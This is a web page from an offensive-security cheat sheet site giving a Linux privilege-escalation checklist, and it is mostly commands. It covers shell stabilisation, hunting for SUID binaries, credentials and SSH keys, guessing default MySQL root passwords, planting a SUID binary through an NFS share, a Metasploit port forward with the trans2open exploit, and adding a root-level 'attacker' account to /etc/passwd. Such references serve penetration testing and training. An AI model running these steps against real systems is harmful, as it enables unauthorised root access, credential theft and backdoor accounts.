<!DOCTYPE html>
<html>
  <head>
    <title>Exploit-me.com - CheatSheet</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2022-04-08T14:19:45 CEST">
<title>Linux Privilege Escalation :: Exploit-me.com - CheatSheet</title>
<link rel="shortcut icon" href="/cheatsheet/images/favicon.png" type="image/x-icon" />
<link href="/cheatsheet/css/nucleus.css" rel="stylesheet">
<link href="/cheatsheet/css/font-awesome.min.css" rel="stylesheet">
<link href="/cheatsheet/css/featherlight.min.css" rel="stylesheet">
<link href="/cheatsheet/css/auto-complete.css" rel="stylesheet">
<link href="/cheatsheet/theme-flex/style.css" rel="stylesheet">

<link rel="stylesheet" href="/cheatsheet/css/bootstrap.min.css">
<meta name="description" content="Guide to Linux Privilege Escalation.">



    
  </head>
  <body data-url="/cheatsheet/blog/linux-privilege-escalation/">
    
      <header>
  <div class="logo">
    
	
  
    <a class="baselink" href="/cheatsheet/">Exploit-me.com - CheatSheet</a>
  


  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://exploit-me.com/"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Exploit-Me - Home</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
    <li data-nav-id="/cheatsheet/blog/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/blog/">Blogs</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/">
            Executing Linux Binaries Without Touching Disk
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/crackmapexec/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/crackmapexec/">
            CrackMapExec (a.k.a CME) 
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/windows-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/windows-privilege-escalation/">
            Windows Privilege Escalation.
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/blog/linux-privilege-escalation/" class="dd-item">
        <div>
          <a href="/cheatsheet/blog/linux-privilege-escalation/">
            Linux Privilege Escalation
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>
    <li data-nav-id="/cheatsheet/about/" class="dd-item haschildren
        ">
      <div>
      <a href="/cheatsheet/about/">Abouts</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
      </div>
        <ul>
      <li data-nav-id="/cheatsheet/about/naveed/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/naveed/">
            Naveed
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/about/hbkhan/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/hbkhan/">
            Hbkhan
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
      <li data-nav-id="/cheatsheet/about/asif/" class="dd-item">
        <div>
          <a href="/cheatsheet/about/asif/">
            Khanisgr8
          </a><i class="fa fa-circle-thin read-icon"></i>
        </div>
    </li>
        </ul>
    </li>




    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/cheatsheet/blog/" >
   Blogs</option> 
      <option value="/cheatsheet/blog/executing-linux-binaries-without-touching-disk/" >- Executing Linux Binaries Without Touching Disk</option>
      <option value="/cheatsheet/blog/crackmapexec/" >- CrackMapExec (a.k.a CME) </option>
      <option value="/cheatsheet/blog/windows-privilege-escalation/" >- Windows Privilege Escalation.</option>
      <option value="/cheatsheet/blog/linux-privilege-escalation/"  selected>- Linux Privilege Escalation</option>
  
    <option value="/cheatsheet/about/" >
   Abouts</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
      </div>
    

    <h1>Linux Privilege Escalation</h1>
    
    
    
    <h3 id="stable-your-shell">Stable your shell:</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -c <span style="color:#d88200">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
OR
python3 -c <span style="color:#d88200">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
<span style="color:#111">export</span> <span style="color:#111">PATH</span><span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
<span style="color:#111">export</span> <span style="color:#111">TERM</span><span style="color:#f92672">=</span>xterm-256color
<span style="color:#111">alias</span> <span style="color:#111">ll</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;ls -lsaht --color=auto&#39;</span>
Ctrl + Z <span style="color:#f92672">[</span>Background Process<span style="color:#f92672">]</span>
stty raw -echo <span style="color:#111">;</span> <span style="color:#111">fg</span> <span style="color:#111">;</span> reset
stty columns <span style="color:#ae81ff">200</span> rows <span style="color:#ae81ff">200</span>
</code></pre></div><h3 id="various-capabilities">Various Capabilities?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat
</code></pre></div><h3 id="compilation">Compilation</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file /bin/bash
uname -a
cat /etc/*-release
cat /etc/issue
</code></pre></div><h3 id="what-arch-">What Arch ?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file /bin/bash

Kernel?
uname -a

Issue/Release?
cat /etc/issue
cat /etc/*-release

Are we a real user?
sudo -l
ls -lsaht /etc/sudoers
</code></pre></div><h3 id="are-any-users-a-member-of-exotic-groups">Are any users a member of exotic groups?</h3>
<p><code>groups &lt;user&gt;</code></p>
<h3 id="check-out-your-shells-environment-variables">Check out your shell&rsquo;s environment variables.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">env
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
</code></pre></div><h3 id="users">Users?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">cd</span> /home/
ls -lsaht
</code></pre></div><h3 id="web-configs-containing-credentials">Web Configs containing credentials?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">cd</span> /var/www/html/
ls -lsaht
</code></pre></div><h3 id="suid-binaries">SUID Binaries?</h3>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<h3 id="guid-binaries">GUID Binaries?</h3>
<p><code>find / -perm -g=s -type f 2&gt;/dev/null</code></p>
<h3 id="suidguidsudo-escalation">SUID/GUID/SUDO Escalation:</h3>
<p><code>https://gtfobins.github.io/</code></p>
<h3 id="start-monitoring-the-system">start monitoring the system.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/DominicBreuker/pspy/blob/master/README.md
<span style="color:#111">cd</span> /var/tmp/
File Transfer --&gt; pspy32
File Transfer --&gt; pspy64
chmod <span style="color:#ae81ff">755</span> pspy32 pspy64
./pspy&lt;32/64&gt;
</code></pre></div><h3 id="what-does-the-local-network-look-like">What does the local network look like?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netstat -antup
netstat -tunlp
</code></pre></div><h3 id="is-anything-vulnerable-running-as-root">Is anything vulnerable running as root?</h3>
<p><code>ps aux |grep -i 'root' --color=auto</code></p>
<h3 id="mysql-credentials-root-unauthorized-access">MYSQL Credentials? Root Unauthorized Access?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -uroot -p
Enter Password:
root : root
root : toor
root :
</code></pre></div><h3 id="look-at-etc">look at etc:</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">cd</span> /etc/
ls -lsaht
Anything other than root here?
• Any config files left behind?
→ ls -lsaht <span style="color:#111">|</span>grep -i ‘.conf’ --color<span style="color:#f92672">=</span>auto

• If we have root priv information disclosure - are there any .secret in /etc/ files?
→ ls -lsaht <span style="color:#111">|</span>grep -i ‘.secret’ --color<span style="color:#f92672">=</span>aut
</code></pre></div><h3 id="ssh-keys-for-further-compromise">SSH Keys for further compromise?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ls -lsaR /home/

Quick look in:
ls -lsaht /var/lib/
ls -lsaht /var/db/

Quick look in:
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
</code></pre></div><h3 id="file-transfer-capability">File Transfer Capability?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">which wget
which curl
which nc
which fetch <span style="color:#f92672">(</span>BSD<span style="color:#f92672">)</span>
ls -lsaht /bin/ <span style="color:#111">|</span>grep -i <span style="color:#d88200">&#39;ftp&#39;</span> --color<span style="color:#f92672">=</span>auto
</code></pre></div><h3 id="nfs-can-we-exploit-weak-nfs-permissions">NFS? Can we exploit weak NFS Permissions?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/exports
no_root_squash?
https://recipeforroot.com/attacking-nfs-shares/

<span style="color:#f92672">[</span>On Attacking Machine<span style="color:#f92672">]</span>
mkdir -p /mnt/nfs/
mount -t nfs -o <span style="color:#111">vers</span><span style="color:#f92672">=</span>&lt;version 1,2,3&gt; <span style="color:#111">$IP</span>:&lt;NFS Share&gt; /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su &lt;user id matching target machine<span style="color:#960050;background-color:#1e0010">&#39;</span>s user-level privilege.&gt;

<span style="color:#f92672">[</span>On Target Machine<span style="color:#f92672">]</span>
user@host$ ./suid

</code></pre></div><h3 id="read-write-and-execute-files">read, write and execute files?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/var/tmp/
/tmp/
/dev/shm/
</code></pre></div><h3 id="any-exotic-file-system-mountsextended-attributes">Any exotic file system mounts/extended attributes?</h3>
<p><code>cat /etc/fstab</code></p>
<h3 id="forwarding-out-a-weak-service-for-root-priv-with-meterpreter">Forwarding out a weak service for root priv (with meterpreter!):</h3>
<p>Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.
<a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></p>
<p>Forwarding out netbios-ssn EXAMPLE:</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter&gt; portfwd add –l <span style="color:#ae81ff">139</span> –p <span style="color:#ae81ff">139</span> –r <span style="color:#f92672">[</span>target remote host<span style="color:#f92672">]</span>
meterpreter&gt; background
use exploit/linux/samba/trans2open
<span style="color:#111">set</span> RHOSTS 0.0.0.0
<span style="color:#111">set</span> RPORT <span style="color:#ae81ff">139</span>
run
</code></pre></div><h3 id="can-we-write-as-a-low-privileged-user-to-etcpasswd">Can we write as a low-privileged user to /etc/passwd?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">openssl passwd -1
i&lt;3hacking
<span style="color:#111">$1</span>$/UTMXpPC<span style="color:#111">$Wrv6PM4eRHhB1</span>/m1P.t9l.
<span style="color:#111">echo</span> <span style="color:#d88200">&#39;attacker:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:attacker:/home/attacker:/bin/bash&#39;</span> &gt;&gt; /etc/passwd
su attacker
id
</code></pre></div><h3 id="cron">Cron.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crontab –u root –l

Look <span style="color:#00a8c8">for</span> unusual system-wide cron jobs:
cat /etc/crontab
ls /etc/cron.*
</code></pre></div><h3 id="bob-is-a-user-on-this-machine-what-is-every-single-file-he-has-ever-created">Bob is a user on this machine. What is every single file he has ever created?</h3>
<p><code>find / -user miguel 2&gt;/dev/null</code></p>
<h3 id="any-mail-mbox-in-user-home-directory">Any mail? mbox in User $HOME directory?</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#111">cd</span> /var/mail/
ls -lsaht
</code></pre></div><h3 id="linpease">Linpease:</h3>
<p><code>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</code></p>
<h3 id="traitor">Traitor:</h3>
<p><code>https://github.com/liamg/traitor</code></p>
<h3 id="gtfobins">GTFOBins:</h3>
<p><code>https://gtfobins.github.io/</code></p>
<h3 id="pspy32pspy64">PSpy32/Pspy64:</h3>
<p><code>https://github.com/DominicBreuker/pspy/blob/master/README.md</code></p>
<h3 id="linux-privilege-escalation">Linux Privilege Escalation:</h3>
<p><code>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</code></p>


    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/cheatsheet/blog/windows-privilege-escalation/" title="Windows Privilege Escalation."> <i class="fa fa-chevron-left"></i><label>Windows Privilege Escalation.</label></a>
    <a class="nav nav-next" href="/cheatsheet/about/" title="Abouts" style="margin-right: 0px;"><label>Abouts</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    
    <div class="tags"> 
      
        <a class="label label-default" href="/cheatsheet/tags/offensive">offensive</a>
      
        <a class="label label-default" href="/cheatsheet/tags/linux">linux</a>
      
        <a class="label label-default" href="/cheatsheet/tags/privilege">Privilege</a>
      
    </div>
    

    

    
    <div class="date">
        <i class='fa fa-calendar'></i> Last update on 05/04/2020
    </div>
    

    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/cheatsheet/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
    
        var baseurl = "\/cheatsheet\/";
    
</script>
<script src="/cheatsheet/js/clipboard.min.js"></script>
<script src="/cheatsheet/js/featherlight.min.js"></script>

<script type="text/javascript" src="/cheatsheet/js/lunr.min.js"></script>
<script type="text/javascript" src="/cheatsheet/js/auto-complete.js"></script>
<script type="text/javascript" src="/cheatsheet/js/search.js"></script>
<script src="/cheatsheet/theme-flex/script.js"></script>




<script src="/cheatsheet/js/scripts.min.js"></script>
    

    
    

    
  </body>
</html>